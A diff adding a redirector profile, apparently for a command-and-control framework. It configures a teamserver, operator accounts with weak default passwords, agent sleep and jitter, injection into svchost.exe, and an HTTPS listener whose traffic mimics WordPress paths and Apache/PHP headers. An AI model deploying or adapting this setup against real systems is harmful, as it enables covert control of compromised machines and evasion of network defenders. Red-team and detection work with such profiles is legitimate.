@@ -1,0 +1,77 @@
+# Redirector Profile
+# Designed for deployments behind a redirector, CDN, or reverse proxy.
+# The agent connects to the redirector domain, which forwards traffic to the teamserver.
+
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm       = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "operator" {
+        Password = "password1234"
+    }
+
+    user "Neo" {
+        Password = "password1234"
+    }
+
+    user "<YOUR_USERNAME>" {
+        Password = "<YOUR_PASSWORD>"
+    }
+}
+
+Demon {
+    Sleep  = 10
+    Jitter = 25
+
+    # Enable when behind a proxy that sets X-Forwarded-For
+    TrustXForwardedFor = true
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
+    }
+}
+
+Listeners {
+    Http {
+        Name         = "Redirector HTTPS"
+        Hosts        = [
+            "<YOUR_REDIRECTOR_DOMAIN>",   # Domain pointing to your redirector
+        ]
+        HostBind     = "0.0.0.0"          # Teamserver listens on all interfaces
+        HostRotation = "round-robin"
+        PortBind     = 443                # Teamserver listener port
+        PortConn     = 443                # Port the agent connects to on the redirector
+        Secure       = true
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+
+        Uris = [
+            "/wp-content/uploads/",
+            "/wp-includes/js/query.min.js",
+            "/feed/",
+        ]
+
+        Headers = [
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Accept-Encoding: gzip, deflate, br",
+        ]
+
+        Response {
+            Headers = [
+                "Content-Type: text/html; charset=UTF-8",
+                "Server: Apache/2.4.56",
+                "X-Powered-By: PHP/8.1.2",
+                "Connection: keep-alive",
+            ]
+        }
+    }
+}
